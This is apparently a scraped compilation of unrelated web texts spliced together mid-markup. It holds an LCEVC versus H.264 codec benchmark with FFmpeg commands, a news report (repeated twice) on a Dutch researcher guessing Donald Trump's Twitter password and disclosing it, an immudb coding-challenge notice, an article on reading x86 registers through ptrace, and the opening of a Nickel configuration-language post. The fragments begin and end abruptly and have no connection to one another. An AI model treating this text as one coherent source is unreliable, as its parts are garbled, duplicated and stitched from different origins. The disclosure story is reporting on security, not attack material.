data-lazy-src="https://i0.wp.com/ottverse.com/wp-content/uploads/2020/10/crowd-run.png?resize=1024%2C576&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></figure>



<p>The CrowdRun sequence (<a rel="noreferrer noopener" target="_blank" href="https://media.xiph.org/video/derf/">download from xiph</a>) is also popular because it has so many different elements that are hard to compress. There are sections of grass with fine details, a whole lot of people running in one direction (with clearly visible facial expressions), a tree right in the middle of the scene, and a lot of texture in the background (trees, clouds, etc.). Everything that’s needed to trouble an encoder is here!</p>



<h3><span id="Software"></span>Software<span></span></h3>



<p>V-Nova provided me with an FFmpeg build (4.3.1) with LCEVC enabled. It hasn’t been released to the public yet, but if you are interested in getting your hands on an LCEVC encoder and decoder, please reach out to the V-Nova team, and they’ll help you out.</p>



<p>Note: you need both an LCEVC-enabled encoder and decoder to test LCEVC which is what V-Nova gave me (<code>ffmpeg</code> and <code>ffplay</code> with LCEVC enabled).</p>



<h3><span id="Process"></span>Process<span></span></h3>



<p>As with all codec analysis, I ran the chosen sequences through the <strong>LCEVC encoder with H.264/AVC (libx264) as its base-codec and then ran the same sequence through <strong>H.264/</strong>AVC (libx264) using a range of bitrates in CBR mode</strong>. </p>



<p>The inputs are 1080p @ 50 fps and the same is retained for the output (1080p50).</p>



<p>I disabled tuning (<code>vmaf</code>, <code>psnr</code>, etc.) and chose a 1 sec GOP size for the experiments.</p>



<p><strong>Evaluation: </strong></p>



<ol><li>I computed the PSNR and VMAF values at different bitrates and used them to evaluate the codecs objectively.</li><li>I did side-by-side visual comparisons to judge which codec did better. There are screenshots pasted below to show you what I saw. </li></ol>



<p>Ok, let’s look at the tests and results now. </p>



<h2><span id="ParkJoy_LCEVC_vs_AVC"></span>ParkJoy: LCEVC vs. AVC<span></span></h2>



<h3><span id="Expt_1_CBR_using_an_IPPP_Structure_(no_Bpictures)"></span>Expt 1. CBR using an IPPP Structure (no B-pictures)<span></span></h3>



<p>For the first set of experiments, I chose a simple “IPPP” GOP structure without any B-pictures. With this fixed GOP structure, I was able to take any scene-change detection, or dynamic-GOP-length (or mini-GOP) decision algorithms out of the picture, and keep the focus purely on the way the two codecs are designed.</p>



<p>Here is an example of encoding with LCEVC using FFmpeg. You need to specify a set of parameters called the <code>eil_params</code> that are then transmitted to the base codec which is H.264/AVC (libx264) in this case.</p>



<p>For example, in the command line below, I instruct the base codec to disable B pictures, to use CBR encoding, disable scenecut detection, and use the <code>veryslow</code> preset. The <code>threads 1</code> is to ensure repeatability between H.264/AVC encodes (LCEVC is deterministic). </p>



<p><strong>Note</strong>: For speed comparisons, <code>threads 1</code> is disabled. </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v lcevc_h264 -base_encoder x264 -threads 1 -r 50 -g 50 -b:v 1200k -eil_params "rc_pcrf_base_rc_mode=cbr;bframes=0;preset=veryslow;rc_pcrf_ipp_mode=1;scenecut=0"  parkjoy_1080p50_1200k_lcevc_ipp.mp4</code></pre>



<p>The equivalent AVC command line is – </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v libx264 -threads 1 -r 50 -g 50 -b:v 1200k -bufsize 1200k -maxrate 1200k -sc_threshold 0 -preset veryslow -bf 0  parkjoy_1080p50_1200k_avc_ipp.mp4</code></pre>



<p>After repeating the encodes over a range of bitrates, I plotted the PSNR and VMAF values and here are the plots. </p>

<p>The RD-Plot above shows a substantial gain for LCEVC vs. vanilla H.264/AVC. At very high bitrates, the PSNR values converge, but, at lower bitrates, the gap is substantial. </p>



<p>If we compute the BD-Rate using the PSNR-Bitrate data, <strong>we get a value of <code>-28.07%</code> and this is huge</strong>. It implies that our tests were able to demonstrate that <strong>LCEVC can give a 28% average bitrate savings over H.264/AVC for equivalent video quality (computed using PSNR).  </strong></p>



<p>Here are the VMAF results plotted against the bitrate values. Again, as you can see, there is an immediate benefit to using LCEVC over AVC alone. </p>



<h3><span id="Expt_2_CBR_using_Bpictures"></span>Expt 2. CBR using B-pictures<span></span></h3>



<p>This command line is similar to what was used for the IPP mode, except, we enable B-frames. So, the encoder is allowed to use B-pictures and decide for itself, how many B-pictures to use, and where to place them. </p>



<p>The LCEVC command line is shown below. </p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v lcevc_h264 -base_encoder x264 -threads 1 -r 50 -g 50 -b:v 1200k -eil_params "rc_pcrf_base_rc_mode=cbr;preset=veryslow;scenecut=0" parkjoy_1080p50_1200k_lcevc.mp4</code></pre>



<p>The H.264/AVC equivalent command used is –</p>



<pre><code>ffmpeg.exe -i park_joy_1080p50.y4m -c:v libx264 -threads 1 -r 50 -g 50 -b:v 1200k -bufsize 1200k -maxrate 1200k  -preset veryslow -sc_threshold 0  parkjoy_1080p50_1200k_avc.mp4</code></pre>



<p>Here are the PSNR and VMAF values plotted against the bitrates. </p>

<p>Again, as you can see, there is an immediate benefit to using LCEVC over H.264/AVC alone <strong>with a -20% BD-Rate value that indicates a savings of 20% for LCEVC over AVC at equivalent video quality.</strong></p>



<p>Now, let’s switch over to the CrowdRun sequence and repeat these tests.</p>



<h2><span id="CrowdRun_%E2%80%93_LCEVC_vs_AVC"></span>CrowdRun – LCEVC vs AVC<span></span></h2>



<p>I then repeated the experiments using the CrowdRun sequence, 1080p50 with the output being 1080p50. </p>



<h3><span id="Expt_1_CBR_using_an_IPPP_Structure_(no_Bpictures)-2"></span>Expt 1. CBR using an IPPP Structure (no B-pictures)<span></span></h3>



<p>Here are the results for the CrowdRun sequence with only P-pictures. </p>

<p>Again, we can see that the difference is quite obvious and that underscores the benefit of adopting the LCEVC coding standard. </p>



<p><strong>The PSNR vs Bitrate plot translates to a 24.53% bitrate savings (using BD-Rate calculations) for LCEVC over AVC at equivalent video quality. </strong></p>

<p><strong>Whatever the objective metrics say, I believe that visual comparison is important and has to be performed when you are comparing codecs. You cannot rely only on the objective metrics to derive your conclusions</strong></p>



<p>So, let’s take a look at screenshots from the ParkJoy and CrowdRun experiments. I took care to ensure that the same picture-types are being compared.</p>



<p>The images below are from the ParkJoy sequence encoded at 108p50, 3600 kbps. The image on the left is from the LCEVC bitstream and the image to the right is from the AVC bitstream.</p>

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

<p>Our Open Source immudb immutable datastore builds on the traditional key-value data model guaranteeing immutability  in a quite unique manner. This simple yet generic data model provides the basis for the design of more complex and challenging immutable data models - like document-like data models.</p>
<h2 id="instructions">Instructions</h2>
<p>A document data model is composed of identifiable elements which have properties and may be related to other elements in many different ways. For more information about document data models, we've listed some helpful resources.</p>
<p>We expect a minimal functional implementation written in Go (including unit testing) - either fully integrated into immudb or as a standalone component. The new immutable document data model needs to be built on top of the immudb immutable key-value model in order to leverage immutability properties. </p>
<p>Below are the commands for getting the immudb Docker image using a Linux shell. You'll find more details about how to download and get started with immudb in our <a href="https://docs.immudb.io/jumpstart.html" rel="nofollow noopener noreferrer" target="_blank">developer jumpstart</a>.</p>
<ol>
<li>Pull immudb Docker Image from Docker Hub:</li>
</ol>
<div><pre><code>docker pull codenotary/immudb:latest
</code></pre></div>
<ol start="2">
<li>Run immudb in a container:</li>
</ol>
<div><pre><code>docker run -it -d -p 3322:3322 -p 9497:9497 --name immudb codenotary/immudb:latest
</code></pre></div>
<p>In developing your solution, you'll have to make decisions that are related to:</p>
<ol>
<li><strong>API</strong> which stores and retrieves documents and provide proof of no tampering </li>
<li><strong>Data format</strong> which defines how objects are exchanged between final application and storage </li>
<li><strong>Atomicity</strong> at the level of document property, single, or multiple document </li>
<li><strong>Concurrency</strong> to allow concurrent read and update operations </li>
<li><strong>Granularity</strong> of evidence to prove whether a whole document or only the document property is unchanged and untampered</li>
</ol>
<p>Please submit your solution via email to <a href="mailto:challenge@vchain.us">challenge@vchain.us</a> before December 20th, 2020, 0:00AM CST. All code submitted at a later time, will not be included in our decision process.</p>
<h2 id="competition-price-assignment-panel">Competition Price Assignment Panel</h2>
<p>Our panel is comprised of Jerónimo Irázabal, immudb maintainer and project manager, Dennis Zimmer, CTO of vChain, and Michele Meloni, immudb core developer.</p>
<p>The two winners of the competition will be announced on this page on December 22nd, 2020. We will select the best data models based on design decisions, implementation and performance as well as overall code quality. </p>
<p>Feel free to also share your approach, testing, and/or anything interesting you have learned in the #immuchallenge channel in <a href="https://open-immutability.slack.com/" rel="nofollow noopener noreferrer" target="_blank">slack</a>. </p>
<h2 id="prizes">Prizes</h2>
<ul>
<li>1st place - <strong>$750</strong> (Amazon.com Gift Card)</li>
<li>2nd place - <strong>$350</strong> (Amazon.com Gift Card)</li>

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

<p>In this article, I would like to shortly describe the methods used
to dump and restore the different kinds of registers on 32-bit
and 64-bit x86 CPUs.  The first part will focus on General Purpose
Registers, Debug Registers and Floating-Point Registers up to the XMM
registers provided by the SSE extension.  I will explain how their
values can be obtained via the <code>ptrace(2)</code> interface.</p>

<p>The <code>ptrace(2)</code> API is commonly used in all modern BSD systems
and Linux, as all of them derive it from the original form designed
and implemented in 4.3BSD.  The primary focus in this article is
on the FreeBSD and NetBSD systems.  Nevertheless, the users of other
Operating Systems such as OpenBSD, DragonFly BSD or Linux can still
benefit from this article as the basic principles are the same
and the code examples are intended to be easily adapted to other
platforms.</p>

<p>A single CPU (in modern hardware: CPU core or CPU thread,
if hyperthreading is available) can execute only one program thread
at a time.  In order to be able to run multiple processes and threads
quasi-simultaneously, the Operating System must perform <em>context
switching</em> — that is periodically suspend the currently running thread,
save its state, restore the saved state of another thread and resume it.
Saving and restoring the values of the processor’s registers play
an important part in context switching.  It is important that
this process is fully transparent to the process being switched,
and in a properly implemented kernel there should be no side effects
that are perceptible to the program.</p>

<p>The debugger may need to examine the register sets of the debugged
program for a number of reasons.  By inspecting the Program Counter,
it is able to determine the location in source code at which
the execution will continue, and by altering it it can control
the execution.  The Stack Pointer is necessary to introspect variables
stored on the stack, while the remaining registers can hold variables
themselves.</p>

<p>A special set of the x86 registers are the Debug Registers.  They are
not accessible to the program itself; however, they can be read
or written by the debugger.  They allow setting hardware assisted
breakpoints (instruction execute trap) on the code being executed,
and watchpoints (read and/or write operation trap) on the variables.</p>

<h2 id="general-purpose-registers-gpr">General Purpose Registers (GPR)</h2>

<h3 id="copying-gprs">Copying GPRs</h3>

<p>The term ‘General Purpose Registers’ is a bit ambiguous.
In the narrower sense, it means the few (8 on i386, 16 on amd64)
baseline registers that can be used to store arbitrary data (usually
integers or pointers).  In the wider sense it means all baseline
registers in the processor architecture, historically excluding
floating-point registers and special kinds of registers.  On x86, this
includes the ‘narrower sense’ general-purpose registers, the Program
Counter (EIP/RIP), segment registers and the flag register.</p>

<p>The majority of the General Purpose Registers can be copied directly,
e.g. using the <code>MOV</code> instruction, or pushed onto the stack
via <code>PUSH</code>.  The EIP/RIP register can be copied using the <code>LEA</code>
instruction, and restored via <code>JMP</code>.  The flag register can be pushed
onto the stack via <code>PUSHFD</code>/<code>PUSHFQ</code>, and afterwards popped from it
via <code>POPFD</code>/<code>POPFQ</code>.</p>

<p>The listing below demonstrates a program that grabs the values of all
amd64 GPRs at an arbitrary point during the execution and prints them
after returning from assembly.</p>

<h3 id="the-gpr-ptrace-2-api">The GPR ptrace(2) API</h3>

<p>Both FreeBSD and NetBSD use the <code>PT_GETREGS</code> request to get the values
of GPRs from the program, and <code>PT_SETREGS</code> to update them.
The requests take a pointer to <code>struct reg</code> as an argument.</p>

<p>On FreeBSD, both i386 and amd64 have the individual registers listed
as fields of the struct.  On NetBSD, i386 uses a regular structure,
while amd64 puts all values into an array whose indices are defined
in the headers as constants.</p>

<p>The listing below compares the structures used on FreeBSD and NetBSD.
Note that NetBSD/amd64 uses a special macro.  For example,
<code>greg(rdi RDI, 0)</code> defines <code>_REG_RDI</code>.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>We are making the <a href="https://www.github.com/tweag/nickel">Nickel</a> repository public. Nickel is an experimental configuration
language developed at Tweag. While this is not the time for the first
release yet, it is an occasion to talk about this project. The goal of this
post is to give a high-level overview of the project. If your curiosity is tickled
but you are left wanting to learn more, fear not, as we will publish
more blog posts on specific aspects of the language in the future. But for
now, let’s have a tour!</p>
<p>[<strong>Disclaimer</strong>: the actual syntax of Nickel being still worked on, I’m freely
using as-of-yet non-existing syntax for illustrative purposes. The underlying
features are however already supported.]</p>
<h2>The inception</h2>
<p>We, at Tweag, are avid users of the <a href="https://nixos.org/">Nix</a> package manager. As it
happens, the configuration language for Nix (also called Nix) is
a pretty good configuration language, and would be applicable to many
more things than just package management.</p>
<p>All in all, the Nix language is a lazy JSON with functions. It is
simple yet powerful. It is used to generate Nix’s package descriptions
but would be well
suited to write any kind of configuration (<a href="https://www.terraform.io/">Terraform</a>,
<a href="https://kubernetes.io/">Kubernetes</a>, etc…).</p>
<p>The rub is that the interpreter for Nix-the-language is tightly
coupled with Nix-the-package manager. So, as it stands, using the
Nix language for anything else than package management is a rather
painful exercise.</p>
<p>Nickel is our attempt at answering the question: what would
Nix-the-language look like if it was split from the package manager?
While taking the opportunity to improve the language a little,
building on the experience of the Nix community over the years.</p>
<h2>What’s Nickel, exactly ?</h2>
<p>Nickel is a lightweight generic configuration language. In that it can
replace YAML as your application’s configuration language. Unlike
YAML, though, it anticipates large configurations by being
programmable. Another way to use Nickel is to generate static
configuration files — <em>e.g.</em> in JSON, YAML — that are then fed to another system. Like
Nix, it is designed to have a simple, well-understood core: at its
heart, it is JSON with functions.</p>
<p>But past experience with Nix also brings some insights on which aspects of the
language could be improved. Whatever the initial scope of a language is, it will
almost surely be used in a way that deviates from the original plan: you create
a configuration language to describe software packages, and next thing you know,
somebody needs to implement a <a href="https://github.com/NixOS/nixpkgs/pull/11484">topological sort</a>.</p>
<p>Nickel strives to retain the simplicity of Nix, while extending it
according to this feedback.
Though, you can do perfectly fine without the new features and just write Nix-like code.</p>
<h2>Yet another configuration language</h2>
<p>At this point you’re probably wondering if this hasn’t already been done elsewhere.
It seems that more and more languages are born every day, and surely there
already exist configuration languages with a similar purpose to Nickel:
<a href="https://github.com/bazelbuild/starlark">Starlark</a>, <a href="https://jsonnet.org/">Jsonnet</a>, <a href="https://dhall-lang.org/">Dhall</a> or <a href="https://cuelang.org/">CUE</a>, to name
a few. So why Nickel?</p>
<h2>Typing</h2>
<p>Perhaps the most important difference with other configuration languages is
Nickel’s approach to typing.</p>
<p>Some languages, such as <a href="https://jsonnet.org/">Jsonnet</a> or <a href="https://github.com/bazelbuild/starlark">Starlark</a>, are not
statically typed. Indeed, static types can be seen as superflous in a configuration
language: if your program is only run once on fixed inputs, any type error will
be reported at run-time anyway. Why bother with a static type system?</p>
<p>On the other hand, more and more systems rely on complex configurations, such as
cloud infrastructure (<a href="https://www.terraform.io/">Terraform</a>, <a href="https://kubernetes.io/">Kubernetes</a> or
<a href="https://github.com/NixOS/nixops">NixOps</a>), leading the corresponding programs to become increasingly
complex, to the point where static types are beneficial. For reusable code —
that is, library functions — static types add structure, serve as
documentation, and eliminate bugs early.</p>
<p>Although less common, some configuration languages are statically typed,
including <a href="https://dhall-lang.org/">Dhall</a> and <a href="https://cuelang.org/">CUE</a>.</p>
<p>Dhall features a powerful type system that is able to type a wide range of
idioms. But it is complex, requiring some experience to become fluent in.</p>
<p>CUE is closer to what we are striving for. It has an optional and well-behaved
type system with strong guarantees. In exchange for which, one can’t write nor
type higher-order functions in general, even if some simple functions are
possible to encode.</p>
<h3>Gradual typing</h3>
<p>Nickel, features a <a href="https://en.wikipedia.org/wiki/Gradual_typing"><em>gradual type system</em></a>.
Gradual types are unobtrusive: they make it possible to statically
type reusable parts of your programs, but you are still free to write
configurations without any types. The
interpreter safely handles the interaction between the typed and untyped worlds.</p>
<p>Concretely, typed library code like this:</p>
<div data-language="text"><pre><code>// file: mylib.ncl
{
  numToStr : Num -&gt; Str = fun n =&gt; ...;
  makeURL : Str -&gt; Str -&gt; Num -&gt; Str = fun proto host port =&gt;
    "${proto}://${host}:${numToStr port}/";
}</code></pre></div>
<p>can coexist with untyped configuration code like this:</p>
<div data-language="text"><pre><code>// file: server.ncl
let mylib = import "mylib.ncl" in
let host = "myproject.com" in
{
  host = host;
  port = 1;
  urls = [
    mylib.makeURL "myproto" host port,
    {protocol = "proto2"; server = "sndserver.net"; port = 4242}
  ];
}</code></pre></div>
<p>In the first snippet, the body of <code>numToStr</code> and <code>makeURL</code> are statically
checked: wrongfully calling <code>numToStr proto</code> inside <code>makeURL</code> would raise an
error even if <code>makeURL</code> is never used. On the other hand, the second snippet is
not annotated, and thus not statically checked. In particular, we mix an URL
represented as a string together with one represented as a record in the same
list. The interpreter rather inserts run-time checks, or <em>contracts</em>, such
that if <code>makeURL</code> is misused then the program fails with an
appropriate error.</p>
<p>Gradual types also lets us keep the type system simple: even in
statically typed code if you want to write a component that the type
checker doesn’t know how to verify, you don’t have to type-check that
part.</p>
<h3>Contracts</h3>
<p>Complementary to the static type system, Nickel offers <em>contracts</em>. Contracts
offer precise and accurate dynamic type error reporting, even in the
presence of function types. Contracts are used internally by
Nickel’s interpreter to insert guards at the boundary between typed and untyped
chunks. Contracts are available to the programmer as well, to give them the
ability to enforce type assertions at run-time in a simple way.</p>
<p>One pleasant consequence of this design is that the exposure of the user to the
type system can be progressive:</p>
<ul>
<li>Users writing configurations can just write Nix-like code while ignoring
(almost) everything about typing, since you can seamlessly call a typed
function from untyped code.</li>
<li>Users writing consumers or verifiers of these configurations would use
contracts to model data schemas.</li>
<li>Users writing libraries would instead use the static type
system.</li>
</ul>
<p>An example of contract is given in the next section.</p>
<h2>Schemas</h2>
<p>While the basic computational blocks are functions, the basic data blocks in
Nickel are records (or objects in JSON). Nickel supports writing self-documenting
record schemas, such as:</p>
<div data-language="text"><pre><code>{
  host | type: Str
       | description: "The host name of the server."
